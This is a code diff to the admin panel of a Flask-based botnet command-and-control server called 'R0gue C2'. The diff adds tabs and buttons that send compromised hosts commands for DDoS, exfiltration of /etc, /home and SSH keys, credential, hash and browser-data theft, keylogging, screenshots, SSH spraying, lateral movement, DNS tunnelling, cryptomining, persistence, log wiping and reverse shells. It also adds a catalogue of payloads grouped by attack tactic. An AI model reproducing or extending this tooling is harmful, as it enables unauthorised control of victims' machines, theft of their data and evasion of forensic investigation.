@@ -205,7 +205,7 @@ def admin_panel():
         <title>R0gue C2 Admin Panel</title>
         <style>
             body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }
-            .container { max-width: 1200px; margin: 0 auto; }
+            .container { max-width: 1400px; margin: 0 auto; }
             .header { background: #111; padding: 20px; border-bottom: 2px solid #00ff00; }
             .section { background: #151515; padding: 20px; margin: 20px 0; border: 1px solid #333; }
             .bot { background: #1a1a1a; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0000; }
@@ -221,6 +221,20 @@ def admin_panel():
             .error { color: #ff0000; }
             .active-bot { border-left: 4px solid #00ff00 !important; }
             .bot-stats { font-size: 12px; color: #888; margin-top: 5px; }
+            .button-group { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
+            .button-group button { flex: 1; min-width: 120px; }
+            .payload-btn { background: #2a2a5a; }
+            .recon-btn { background: #5a2a2a; }
+            .attack-btn { background: #5a2a5a; }
+            .stealth-btn { background: #2a5a2a; }
+            .util-btn { background: #2a5a5a; }
+            .compound-btn { background: #5a5a2a; }
+            .tab-container { display: flex; border-bottom: 1px solid #444; margin-bottom: 20px; }
+            .tab { padding: 10px 20px; cursor: pointer; border: 1px solid transparent; }
+            .tab.active { background: #222; border: 1px solid #444; border-bottom: none; }
+            .tab-content { display: none; }
+            .tab-content.active { display: block; }
+            .command-history { max-height: 300px; overflow-y: auto; }
         </style>
     </head>
     <body>
@@ -230,84 +244,347 @@ def admin_panel():
                 <p>Server Time: {{ time }} | Active Bots: {{ bot_count }} | Commands Pending: {{ pending_count }}</p>
             </div>
             
-            <div class="section">
-                <h2> Active Bots ({{ bot_count }})</h2>
-                {% for bot in bot_list %}
-                <div class="bot {{ 'active-bot' if bot.last_seen_diff < 60 else '' }}">
-                    <strong> {{ bot.id }}</strong>
-                    <span class="status">● Implant ID: {{ bot.implant_id }}</span>
-                    <span class="status">● Last seen: {{ bot.last_seen }} ({{ bot.last_seen_diff }}s ago)</span>
-                    <span class="status">● IP: {{ bot.ip }}</span>
-                    <div class="bot-stats">
-                         Beacons: {{ bot.beacon_count }} |  Cmds Sent: {{ bot.commands_sent }} |  Results: {{ bot.results_received }}
-                    </div>
-                    
-                    <div class="command-form">
-                        <input type="text" id="cmd_{{ bot.id }}" placeholder="Command (whoami, ls, etc.)" style="width: 300px;">
-                        <select id="type_{{ bot.id }}">
-                            <option value="shell">Shell Command</option>
-                            <option value="trigger_ddos">DDoS Attack</option>
-                            <option value="trigger_exfil">Exfiltrate Data</option>
-                            <option value="trigger_dumpcreds">Dump Credentials</option>
-                            <option value="trigger_mine">Start Miner</option>
-                            <option value="reverse_shell">Reverse Shell</option>
-                        </select>
-                        <button onclick="sendCommand('{{ bot.id }}')">Send Command</button>
-                        <button onclick="clearPending('{{ bot.id }}')" style="background: #660000;">Clear Pending</button>
-                    </div>
-                    
-                    {% if pending_commands.get(bot.id) %}
-                    <div class="results" style="border-left: 3px solid orange;">
-                        <h4> Pending Commands:</h4>
-                        {% for cmd in pending_commands[bot.id] %}
-                        <div><small>→</small> {{ cmd }}</div>
-                        {% endfor %}
-                    </div>
-                    {% endif %}
-                    
-                    {% if results.get(bot.id) %}
-                    <div class="results">
-                        <h4> Recent Results:</h4>
-                        {% for result in results[bot.id][-3:] %}
-                        <div><small>{{ result.timestamp }}:</small> {{ result.result[:150] }}...</div>
-                        {% endfor %}
-                    </div>
-                    {% endif %}
-                </div>
-                {% endfor %}
+            <div class="tab-container">
+                <div class="tab active" onclick="switchTab('bots')"> Active Bots ({{ bot_count }})</div>
+                <div class="tab" onclick="switchTab('operations')"> Operations</div>
+                <div class="tab" onclick="switchTab('payloads')"> Payloads</div>
+                <div class="tab" onclick="switchTab('results')"> Results</div>
+                <div class="tab" onclick="switchTab('server')"> Server Status</div>
             </div>
             
-            <div class="section">
-                <h2> Quick Commands</h2>
-                <button onclick="sendToAll('whoami')">Whoami (All)</button>
-                <button onclick="sendToAll('uname -a')">System Info</button>
-                <button onclick="sendToAll('ip a')">Network Info</button>
-                <button onclick="sendToAll('trigger_dumpcreds')">Dump Creds</button>
-                <button onclick="sendToAll('ls -la /home')">List Homes</button>
+            <!-- BOTS TAB -->
+            <div id="bots-tab" class="tab-content active">
+                <div class="section">
+                    <h2> Active Bots ({{ bot_count }})</h2>
+                    {% for bot in bot_list %}
+                    <div class="bot {{ 'active-bot' if bot.last_seen_diff < 60 else '' }}">
+                        <strong> {{ bot.id }}</strong>
+                        <span class="status">● Implant ID: {{ bot.implant_id }}</span>
+                        <span class="status">● Last seen: {{ bot.last_seen }} ({{ bot.last_seen_diff }}s ago)</span>
+                        <span class="status">● IP: {{ bot.ip }}</span>
+                        <div class="bot-stats">
+                             Beacons: {{ bot.beacon_count }} |  Cmds Sent: {{ bot.commands_sent }} |  Results: {{ bot.results_received }}
+                        </div>
+                        
+                        <div class="command-form">
+                            <input type="text" id="cmd_{{ bot.id }}" placeholder="Command (whoami, ls, etc.)" style="width: 300px;">
+                            <select id="type_{{ bot.id }}">
+                                <option value="shell">Shell Command</option>
+                                <option value="trigger_ddos">DDoS Attack</option>
+                                <option value="trigger_exfil">Exfiltrate Data</option>
+                                <option value="trigger_dumpcreds">Dump Credentials</option>
+                                <option value="trigger_mine">Start Miner</option>
+                                <option value="trigger_stealthinject">PolyRoot Persistence</option>
+                                <option value="reverse_shell">Reverse Shell</option>
+                                <option value="trigger_sysrecon">System Recon</option>
+                                <option value="trigger_linpeas">PrivEsc Check</option>
+                                <option value="trigger_hashdump">Dump Hashes</option>
+                                <option value="trigger_browsersteal">Browser Data</option>
+                                <option value="trigger_keylogger">Keylogger</option>
+                                <option value="trigger_screenshot">Screenshots</option>
+                                <option value="trigger_logclean">Clean Logs</option>
+                                <option value="trigger_status">Implant Status</option>
+                                <option value="trigger_help">Show Help</option>
+                            </select>
+                            <button onclick="sendCommand('{{ bot.id }}')">Send Command</button>
+                            <button onclick="clearPending('{{ bot.id }}')" style="background: #660000;">Clear Pending</button>
+                            <button onclick="sendToBot('{{ bot.id }}', 'trigger_status')" style="background: #2a5a5a;">Status</button>
+                        </div>
+                        
+                        {% if pending_commands.get(bot.id) %}
+                        <div class="results" style="border-left: 3px solid orange;">
+                            <h4> Pending Commands:</h4>
+                            {% for cmd in pending_commands[bot.id] %}
+                            <div><small>→</small> {{ cmd }}</div>
+                            {% endfor %}
+                        </div>
+                        {% endif %}
+                        
+                        {% if results.get(bot.id) %}
+                        <div class="results command-history">
+                            <h4> Recent Results:</h4>
+                            {% for result in results[bot.id][-5:] %}
+                            <div><small>{{ result.timestamp }}:</small> {{ result.result[:200] }}...</div>
+                            {% endfor %}
+                        </div>
+                        {% endif %}
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <!-- OPERATIONS TAB -->
+            <div id="operations-tab" class="tab-content">
+                <div class="section">
+                    <h2> Quick Commands</h2>
+                    <div class="button-group">
+                        <button onclick="sendToAll('whoami')">Whoami (All)</button>
+                        <button onclick="sendToAll('uname -a')">System Info</button>
+                        <button onclick="sendToAll('ip a')">Network Info</button>
+                        <button onclick="sendToAll('ls -la /home')">List Homes</button>
+                        <button onclick="sendToAll('ps aux')">Process List</button>
+                        <button onclick="sendToAll('df -h')">Disk Usage</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> Reconnaissance & Intelligence</h2>
+                    <div class="button-group">
+                        <button class="recon-btn" onclick="sendToAll('trigger_sysrecon')">System Recon</button>
+                        <button class="recon-btn" onclick="sendToAll('trigger_linpeas')">PrivEsc Check</button>
+                        <button class="recon-btn" onclick="sendToAll('trigger_hashdump')">Dump Hashes</button>
+                        <button class="recon-btn" onclick="sendToAll('trigger_browsersteal')">Browser Data</button>
+                        <button class="recon-btn" onclick="sendToAll('trigger_dumpcreds')">Dump Creds</button>
+                        <button class="recon-btn" onclick="sendToAll('trigger_network_scan')">Network Scan</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> Advanced Operations</h2>
+                    <div class="button-group">
+                        <button class="compound-btn" onclick="sendToAll('trigger_full_recon')">Full Recon Suite</button>
+                        <button class="compound-btn" onclick="sendToAll('trigger_harvest_all')">Harvest All Data</button>
+                        <button class="compound-btn" onclick="sendToAll('trigger_clean_sweep')">Clean Sweep</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> Persistence & Stealth</h2>
+                    <div class="button-group">
+                        <button class="stealth-btn" onclick="sendToAll('trigger_stealthinject')">PolyRoot Persistence</button>
+                        <button class="stealth-btn" onclick="sendToAll('trigger_persistence_setup')">Additional Persistence</button>
+                        <button class="stealth-btn" onclick="sendToAll('trigger_defense_evasion')">Defense Evasion</button>
+                        <button class="stealth-btn" onclick="sendToAll('trigger_logclean')">Clean Logs</button>
+                        <button class="stealth-btn" onclick="sendToAll('trigger_logclean all')">Clean All Logs</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> Monitoring & Collection</h2>
+                    <div class="button-group">
+                        <button class="payload-btn" onclick="sendToAll('trigger_keylogger')">Start Keylogger</button>
+                        <button class="payload-btn" onclick="sendToAll('trigger_keylogger stop')">Stop Keylogger</button>
+                        <button class="payload-btn" onclick="sendToAll('trigger_screenshot')">Start Screenshots</button>
+                        <button class="payload-btn" onclick="sendToAll('trigger_screenshot stop')">Stop Screenshots</button>
+                        <button class="payload-btn" onclick="sendToAll('reverse_shell')">Reverse Shell</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> Lateral Movement & Propagation</h2>
+                    <div class="button-group">
+                        <button class="attack-btn" onclick="sendToAll('trigger_lateral_move')">Lateral Movement</button>
+                        <button class="attack-btn" onclick="sendToAll('trigger_autodeploy')">Auto-Deploy</button>
+                        <button class="attack-btn" onclick="sendToAll('trigger_sshspray')">SSH Spray</button>
+                        <button class="attack-btn" onclick="sendToAll('trigger_dnstunnel')">DNS Tunnel</button>
+                        <button class="attack-btn" onclick="sendToAll('trigger_dnstunnel stop')">Stop DNS Tunnel</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> DDoS & Cryptomining</h2>
+                    <div class="button-group">
+                        <button class="attack-btn" onclick="sendToAll('trigger_ddos 192.168.1.1 80 60')">DDoS Test (60s)</button>
+                        <button class="attack-btn" onclick="sendToAll('trigger_mine')">Start Miner</button>
+                        <button class="attack-btn" onclick="sendToAll('trigger_stopmine')">Stop Miner</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> Implant Management</h2>
+                    <div class="button-group">
+                        <button class="util-btn" onclick="sendToAll('trigger_status')">Check Status</button>
+                        <button class="util-btn" onclick="sendToAll('trigger_self_update')">Self Update</button>
+                        <button class="util-btn" onclick="sendToAll('trigger_help')">Show Help</button>
+                        <button class="util-btn" onclick="sendToAll('trigger_forensics_check')">Forensics Check</button>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2> Data Exfiltration</h2>
+                    <div class="button-group">
+                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /etc')">Exfil /etc</button>
+                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /home')">Exfil /home</button>
+                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /var/log')">Exfil Logs</button>
+                        <button class="payload-btn" onclick="sendToAll('trigger_exfil ~/.ssh')">Exfil SSH Keys</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- PAYLOADS TAB -->
+            <div id="payloads-tab" class="tab-content">
+                <div class="section">
+                    <h2> Payload Management</h2>
+                    <div class="button-group">
+                        <button onclick="location.href='/payloads/'">Browse Payloads</button>
+                        <button onclick="refreshPayloads()">Refresh Payloads</button>
+                    </div>
+                    
+                    <h3> Available Payloads</h3>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 10px;">
+                        <div class="bot">
+                            <strong>System Reconnaissance</strong>
+                            <p><small>Comprehensive system/network intelligence gathering</small></p>
+                            <button onclick="sendToAll('load_payload sysrecon.py')">Load</button>
+                            <button onclick="sendToAll('run_payload sysrecon.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>LinPEAS Light</strong>
+                            <p><small>Linux privilege escalation checker</small></p>
+                            <button onclick="sendToAll('load_payload linpeas_light.py')">Load</button>
+                            <button onclick="sendToAll('run_payload linpeas_light.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>Hash Dumper</strong>
+                            <p><small>Extract password hashes from system</small></p>
+                            <button onclick="sendToAll('load_payload hashdump.py')">Load</button>
+                            <button onclick="sendToAll('run_payload hashdump.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>Browser Stealer</strong>
+                            <p><small>Extract browser credentials and data</small></p>
+                            <button onclick="sendToAll('load_payload browserstealer.py')">Load</button>
+                            <button onclick="sendToAll('run_payload browserstealer.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>Keylogger</strong>
+                            <p><small>Keystroke logging module</small></p>
+                            <button onclick="sendToAll('load_payload keylogger.py')">Load</button>
+                            <button onclick="sendToAll('run_payload keylogger.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>Screenshot Capture</strong>
+                            <p><small>Periodic screen capture</small></p>
+                            <button onclick="sendToAll('load_payload screenshot.py')">Load</button>
+                            <button onclick="sendToAll('run_payload screenshot.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>Log Cleaner</strong>
+                            <p><small>Remove forensic traces from logs</small></p>
+                            <button onclick="sendToAll('load_payload logcleaner.py')">Load</button>
+                            <button onclick="sendToAll('run_payload logcleaner.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>SSH Spray</strong>
+                            <p><small>SSH credential spraying attack</small></p>
+                            <button onclick="sendToAll('load_payload sshspray.py')">Load</button>
+                            <button onclick="sendToAll('run_payload sshspray.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>DNS Tunnel</strong>
+                            <p><small>DNS-based covert C2 channel</small></p>
+                            <button onclick="sendToAll('load_payload dnstunnel.py')">Load</button>
+                            <button onclick="sendToAll('run_payload dnstunnel.py')">Run</button>
+                        </div>
+                        <div class="bot">
+                            <strong>Auto Deploy</strong>
+                            <p><small>Automated network deployment</small></p>
+                            <button onclick="sendToAll('load_payload autodeploy.py')">Load</button>
+                            <button onclick="sendToAll('run_payload autodeploy.py')">Run</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- RESULTS TAB -->
+            <div id="results-tab" class="tab-content">
+                <div class="section">
+                    <h2> Command Results History</h2>
+                    {% for bot_id, bot_results in results.items() %}
+                    <div class="bot">
+                        <h3> {{ bot_id }}</h3>
+                        <div class="results command-history">
+                            {% for result in bot_results[-10:] %}
+                            <div>
+                                <strong>{{ result.timestamp }}</strong><br>
+                                <small>IP: {{ result.client_ip }}</small><br>
+                                <pre style="background: #111; padding: 5px; margin: 5px 0; overflow-x: auto;">{{ result.result[:500] }}{% if result.result|length > 500 %}...{% endif %}</pre>
+                            </div>
+                            {% endfor %}
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <!-- SERVER TAB -->
+            <div id="server-tab" class="tab-content">
+                <div class="section">
+                    <h2> Server Status</h2>
+                    <p><strong>Ngrok URL:</strong> {{ ngrok_url }}</p>
+                    <p><strong>C2 Port:</strong> {{ c2_port }}</p>
+                    <p><strong>Exfil Port:</strong> {{ exfil_port }}</p>
+                    <p><strong>Reverse Shell Port:</strong> 9001</p>
+                    <p><strong>Payloads Repository:</strong> <a href="{{ payload_url }}" target="_blank">{{ payload_url }}</a></p>
+                    <p><strong>Active Bots:</strong> {{ bot_count }}</p>
+                    <p><strong>Pending Commands:</strong> {{ pending_count }}</p>
+                    <p><strong>Uptime:</strong> <span id="uptime">Calculating...</span></p>
+                    
+                    <h3> Quick Actions</h3>
+                    <div class="button-group">
+                        <button onclick="location.reload()">Refresh Page</button>
+                        <button onclick="fetch('/ngrok_status').then(r => r.json()).then(data => alert('Ngrok Status: ' + data.status))">Check Ngrok</button>
+                        <button onclick="fetch('/beacons').then(r => r.json()).then(data => alert('Active Beacons: ' + data.total))">Check Beacons</button>
+                        <button onclick="clearAllPending()">Clear All Pending</button>
+                    </div>
+                </div>
             </div>
             
             <div class="section">
                 <h2> Manual Command</h2>
-                <input type="text" id="manual_bot" placeholder="Bot ID">
+                <input type="text" id="manual_bot" placeholder="Bot ID (or 'all' for all bots)">
                 <input type="text" id="manual_cmd" placeholder="Command" style="width: 400px;">
                 <button onclick="sendManualCommand()">Send</button>
-            </div>
-            
-            <div class="section">
-                <h2> Server Status</h2>
-                <p>Ngrok URL: {{ ngrok_url }}</p>
-                <p>C2 Port: {{ c2_port }}</p>
-                <p>Exfil Port: {{ exfil_port }}</p>
-                <p>Reverse Shell Port: 9001</p>
-                <p>Payloads: <a href="{{ payload_url }}" target="_blank">{{ payload_url }}</a></p>
+                <button onclick="document.getElementById('manual_cmd').value = 'trigger_help'">Insert Help</button>
+                <button onclick="document.getElementById('manual_cmd').value = 'trigger_status'">Insert Status</button>
             </div>
         </div>
         
         <script>
+            let serverStartTime = Date.now();
+            
+            function updateUptime() {
+                const uptimeMs = Date.now() - serverStartTime;
+                const days = Math.floor(uptimeMs / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((uptimeMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((uptimeMs % (1000 * 60)) / 1000);
+                
+                let uptimeStr = '';
+                if (days > 0) uptimeStr += days + 'd ';
+                if (hours > 0) uptimeStr += hours + 'h ';
+                if (minutes > 0) uptimeStr += minutes + 'm ';
+                uptimeStr += seconds + 's';
+                
+                document.getElementById('uptime').textContent = uptimeStr;
+            }
+            
+            setInterval(updateUptime, 1000);
+            updateUptime();
+            
+            function switchTab(tabName) {
+                // Hide all tabs
+                document.querySelectorAll('.tab-content').forEach(tab => {
+                    tab.classList.remove('active');
+                });
+                document.querySelectorAll('.tab').forEach(tab => {
+                    tab.classList.remove('active');
+                });
+                
+                // Show selected tab
+                document.getElementById(tabName + '-tab').classList.add('active');
+                document.querySelector(`[onclick="switchTab('${tabName}')"]`).classList.add('active');
+            }
+            
             function sendCommand(botId) {
                 const cmdInput = document.getElementById('cmd_' + botId);
                 const typeSelect = document.getElementById('type_' + botId);
                 const command = typeSelect.value === 'shell' ? cmdInput.value : typeSelect.value + (cmdInput.value ? ' ' + cmdInput.value : '');
+                
+                if (!command.trim()) {
+                    alert('Please enter a command');
+                    return;
+                }
                 
                 fetch('/command', {
                     method: 'POST',
@@ -319,6 +596,23 @@ def admin_panel():
                 }).then(r => r.json()).then(data => {
                     alert('Command sent to ' + botId + ' (ID: ' + data.command_id + ')');
                     cmdInput.value = '';
+                    setTimeout(() => location.reload(), 1000);
+                }).catch(err => {
+                    alert('Error sending command: ' + err);
+                });
+            }
+            
+            function sendToBot(botId, command) {
+                fetch('/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        beacon_id: botId,
+                        command: command
+                    })
+                }).then(r => r.json()).then(data => {
+                    alert('Command sent to ' + botId);
+                    setTimeout(() => location.reload(), 1000);
                 });
             }
             
@@ -331,7 +625,19 @@ def admin_panel():
                 });
             }
             
+            function clearAllPending() {
+                {% for bot in bot_list %}
+                fetch('/clear_pending/{{ bot.id }}', {
+                    method: 'POST'
+                });
+                {% endfor %}
+                alert('Cleared pending commands for all bots');
+                setTimeout(() => location.reload(), 1000);
+            }
+            
             function sendToAll(command) {
+                if (!confirm('Send "' + command + '" to ALL bots?')) return;
+                
                 {% for bot in bot_list %}
                 fetch('/command', {
                     method: 'POST',
@@ -343,6 +649,7 @@ def admin_panel():
                 });
                 {% endfor %}
                 alert('Command sent to all bots: ' + command);
+                setTimeout(() => location.reload(), 2000);
             }
             
             function sendManualCommand() {
@@ -351,6 +658,11 @@ def admin_panel():
                 
                 if (!botId || !command) {
                     alert('Please enter both Bot ID and Command');
+                    return;
+                }
+                
+                if (botId.toLowerCase() === 'all') {
+                    sendToAll(command);
                     return;
                 }
                 
@@ -363,11 +675,20 @@ def admin_panel():
                     })
                 }).then(r => r.json()).then(data => {
                     alert('Command sent: ' + data.command_id);
+                    document.getElementById('manual_cmd').value = '';
+                    setTimeout(() => location.reload(), 1000);
                 });
             }
             
-            // Auto-refresh every 15 seconds
-            setTimeout(() => location.reload(), 15000);
+            function refreshPayloads() {
+                fetch('/payloads/').then(r => r.text()).then(html => {
+                    alert('Payloads refreshed');
+                    location.reload();
+                });
+            }
+            
+            // Auto-refresh every 30 seconds
+            setTimeout(() => location.reload(), 30000);
         </script>
     </body>
     </html>
@@ -510,13 +831,71 @@ def list_payloads():
         files = os.listdir(payload_dir)
     
     html = f"""
-    <html><body>
-    <h1>Rogue C2 Payload Repository</h1>
-    <ul>
-    {''.join(f'<li><a href="/payloads/{f}">{f}</a></li>' for f in files if f.endswith('.py'))}
-    </ul>
-    </body></html>
+    <html>
+    <head>
+        <title>Rogue C2 Payload Repository</title>
+        <style>
+            body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 20px; }}
+            h1 {{ color: #0f0; }}
+            ul {{ list-style: none; padding: 0; }}
+            li {{ margin: 10px 0; padding: 10px; background: #151515; border: 1px solid #333; }}
+            a {{ color: #0ff; text-decoration: none; }}
+            a:hover {{ color: #fff; text-decoration: underline; }}
+            .payload-info {{ font-size: 12px; color: #888; margin-top: 5px; }}
+        </style>
+    </head>
+    <body>
+        <h1>Rogue C2 Payload Repository</h1>
+        <p><strong>Total Payloads:</strong> {len([f for f in files if f.endswith('.py')])}</p>
+        <ul>
     """
+    
+    # Organize payloads by category
+    payload_categories = {
+        'Reconnaissance': ['sysrecon.py', 'network_scanner.py'],
+        'Privilege Escalation': ['linpeas_light.py', 'persistence.py'],
+        'Credential Access': ['hashdump.py', 'browserstealer.py'],
+        'Collection': ['keylogger.py', 'screenshot.py'],
+        'Defense Evasion': ['logcleaner.py', 'defense_evasion.py'],
+        'Lateral Movement': ['sshspray.py', 'autodeploy.py', 'lateral_movement.py'],
+        'Command & Control': ['dnstunnel.py'],
+        'Impact': ['ddos.py', 'mine.py'],
+        'Persistence': ['polyloader.py']
+    }
+    
+    for category, payloads in payload_categories.items():
+        html += f'<h2>{category}</h2>'
+        for payload in payloads:
+            if payload in files:
+                html += f'''
+                <li>
+                    <a href="/payloads/{payload}">{payload}</a>
+                    <div class="payload-info">
+                        Size: {os.path.getsize(os.path.join(payload_dir, payload)) // 1024} KB | 
+                        <a href="javascript:sendToAll(\\'load_payload {payload}\\')">Load</a> | 
+                        <a href="javascript:sendToAll(\\'run_payload {payload}\\')">Run</a>
+                    </div>
+                </li>
+                '''
+    
+    html += """
+        </ul>
+        <script>
+            function sendToAll(command) {
+                fetch('/command', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        beacon_id: 'all',
+                        command: command
+                    })
+                }).then(() => alert('Command sent to load payload'));
+            }
+        </script>
+    </body>
+    </html>
+    """
+    
     return html
 
 @app.route('/ngrok_status')
